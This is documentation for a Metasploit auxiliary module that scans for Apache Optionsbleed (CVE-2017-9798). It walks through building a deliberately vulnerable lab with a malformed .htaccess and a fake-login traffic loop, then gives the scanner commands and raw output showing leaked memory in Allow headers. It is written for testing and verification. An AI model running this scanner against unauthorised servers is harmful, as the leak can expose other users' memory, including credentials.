## Description

This module scans for the Apache optionsbleed vulnerability where the Allow response header
returned from an OPTIONS request may bleed memory if the server has a .htaccess file
with an invalid Limit method defined.

### Vulnerable Application Setup

This setup is slightly more complex than a default instance, but potentially gives more interesting results.  It is more or less based on a
blog post by [securitysift.com](https://www.securitysift.com/testing-optionsbleed/).

This setup was performed on an Ubuntu 16.04 server with apache 2.4.18-2ubuntu3.1. 
Apache was patched in [2.4.18-2ubuntu3.5](https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-9798.html)

1. First thing we'll do is create 2 virtual host directories with content

    ```
    sudo mkdir -p /var/www/html/s1
    sudo mkdir -p /var/www/html/s2
    
    echo "<Limit method0 method1 method2 method3 method4 method5>
      Allow from all
    </Limit>" | sudo tee /var/www/html/s1/.htaccess
    
    echo "
    <html>
    <h1>Attacker</h1>
    </html>
    " | sudo tee /var/www/html/s1/index.html
    
    echo "
    <?php
            \$user = \$_POST[\"username\"];
            \$pwd = \$_POST[\"password\"];
            \$otherdata = \$_POST[\"otherdata\"];     
    ?>
            <form action=\"index.php\" method=\"POST\">
                    Otherdata: <input type=\"text\" name=\"otherdata\"><br>
                    Username: <input type=\"text\" name=\"username\"><br>
                    Password: <input type=\"text\" name=\"password\"><br>
                    <input type=\"submit\" value=\"Submit\">
            </form>
    " | sudo tee  /var/www/html/s2/index.php
    ```

2. Now we'll modify apache to have 2 virtual hosts, an attacker on port 80 and victim on port 81

    ```
    sudo echo "Listen 80
    Listen 81
    
    <VirtualHost *:81>
      #victim
      DocumentRoot /var/www/html/s2
      ErrorLog \${APACHE_LOG_DIR}/error_victim.log
      CustomLog \${APACHE_LOG_DIR}/access_victim.log combined
    </VirtualHost>
    <VirtualHost *:80>
      #attacker
      DocumentRoot /var/www/html/s1
      ErrorLog \${APACHE_LOG_DIR}/error_attacker.log
      CustomLog \${APACHE_LOG_DIR}/access_attacker.log combined
      <Directory /var/www/html/s1>
        AllowOverride All
      </Directory>
    </VirtualHost>
    " | sudo tee /etc/apache2/sites-enabled/000-default.conf
    ```

3. Restart the service

  ```sudo service apache2 restart```

4. We'll want to generate some traffic to the victim, so we'll use an infinite loop to send fake login requests

    ```
    while true; do curl -d "otherdata=otherdata&username=admin&password=passw0rd" -X POST -s http://[IP]:81/index.php > /dev/null; done
    ```

Now you have 2 virtual hosts, a vulnerable `.htaccess` file on port 80 in root, and memory being churned to simulate a live host.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/apache_optionsbleed```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

### Using the setup mentioned previously

```
[*] Processing optionsbleed.rc for ERB directives.
resource (optionsbleed.rc)> use auxiliary/scanner/http/apache_optionsbleed
resource (optionsbleed.rc)> set rhosts 192.168.2.104
rhosts => 192.168.2.104
resource (optionsbleed.rc)> set threads 10
threads => 10
resource (optionsbleed.rc)> run
[+] Request 1: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,���~,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,,HEAD,��)�~,HEAD,,HEAD,POST
[+] Request 2: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,,HEAD,���~,8�)�~,HEAD,,HEAD,8�)�~,HEAD,��,�~,HEAD,POST
[+] Request 3: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,8�)�~,HEAD,POST
[+] Request 4: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,�4�~,���~,,HEAD,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,,HEAD,,HEAD,��)�~,HEAD,POST
[+] Request 5: [OptionsBleed Response] -> GET,HEAD,OPTIONS,,HEAD,���~,,HEAD,,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 6: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,8�)�~,HEAD,��,�~,HEAD,POST
[+] Request 7: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,,HEAD,���~,8�)�~,HEAD,,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 8: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,,HEAD,�4�~,���~,8�)�~,HEAD,,HEAD,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 9: [OptionsBleed Response] -> GET,HEAD,OPTIONS,�T�~,���~,,HEAD,���~,8�)�~,HEAD,8�)�~,HEAD,,HEAD,8�)�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 10: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,���~,,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,��,�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 11: [OptionsBleed Response] -> GET,HEAD,OPTIONS,,HEAD,�4�~,���~,,HEAD,,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,POST
[+] Request 13: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,�T�~,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 14: [OptionsBleed Response] -> GET,HEAD,OPTIONS,�T�~,��~,,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,,HEAD,allow,HEAD,,HEAD,,HEAD,POST
[+] Request 15: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,8�)�~,HEAD,POST
[+] Request 16: [OptionsBleed Response] -> GET,HEAD,OPTIONS,�T�~,�4�~,���~,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 18: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,,HEAD,�T�~,8�)�~,HEAD,,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,,HEAD,��)�~,HEAD,,HEAD,POST
[+] Request 19: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,,HEAD,�T�~,�4�~,8�)�~,HEAD,,HEAD,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,,HEAD,,HEAD,POST
[+] Request 20: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,�T�~,,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,��,�~,HEAD,,HEAD,��)�~,HEAD,,HEAD,POST
[+] Request 21: [OptionsBleed Response] -> GET,HEAD,OPTIONS,,HEAD,�4�~,,HEAD,8�)�~,HEAD,��,�~,HEAD,POST
[+] Request 22: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,���~,�T�~,���~,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,POST
[+] Request 23: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,,HEAD,�4�~,���~,8�)�~,HEAD,,HEAD,8�)�~,HEAD,8�)�~,HEAD,POST
[+] Request 24: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,���~,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,,HEAD,��)�~,HEAD,,HEAD,POST
[+] Request 25: [OptionsBleed Response] -> GET,HEAD,OPTIONS,,HEAD,�T�~,���~,,HEAD,,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,POST
[+] Request 26: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,���~,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,��,�~,HEAD,,HEAD,��)�~,HEAD,,HEAD,POST
[+] Request 27: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,�4�~,���~,,HEAD,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 28: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,,HEAD,allow,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,allow,HEAD,POST
[+] Request 29: [OptionsBleed Response] -> GET,HEAD,OPTIONS,�T�~,��~,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,,HEAD,allow,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,��)�~,HEAD,POST
[+] Request 30: [OptionsBleed Response] -> GET,HEAD,OPTIONS,�4�~,8�)�~,HEAD,POST
[+] Request 31: [OptionsBleed Response] -> GET,HEAD,OPTIONS,,HEAD,���~,�T�~,,HEAD,,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,POST
[+] Request 32: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,���~,,HEAD,�4�~,8�)�~,HEAD,8�)�~,HEAD,,HEAD,,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,POST
[+] Request 33: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,���~,��~,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 34: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,���~,�4�~,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 35: [OptionsBleed Response] -> GET,HEAD,OPTIONS,,HEAD,���~,���~,���~,,HEAD,,HEAD,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,,HEAD,POST
[+] Request 36: [OptionsBleed Response] -> GET,HEAD,OPTIONS,��~,�4�~,���~,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,��,�~,HEAD,��,�~,HEAD,��,�~,HEAD,��)�~,HEAD,POST
[+] Request 38: [OptionsBleed Response] -> GET,HEAD,OPTIONS,�T�~,���~,8�)�~,HEAD,8�)�~,HEAD,POST
[+] Request 39: [OptionsBleed Response] -> GET,HEAD,OPTIONS,���~,���~,��~,8�)�~,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,allow,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,POST
[+] Request 40: [OptionsBleed Response] -> GET,HEAD,OPTIONS,�T�~,���~,,HEAD,8�)�~,HEAD,8�)�~,HEAD,,HEAD,��,�~,HEAD,,HEAD,allow,HEAD,,HEAD,,HEAD,POST
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Cleanup

If the server is NOT vulnerable, the apache error logs will contain an entry similar to this:

```
[Wed Sep 27 19:54:43.183978 2017] [core:alert] [pid 17659] [client 2.2.2.2:43546] /var/www/html/s1/.htaccess: Could not register method 'method0' for <Limit from .htaccess configuration, referer: http://1.1.1.1/
```
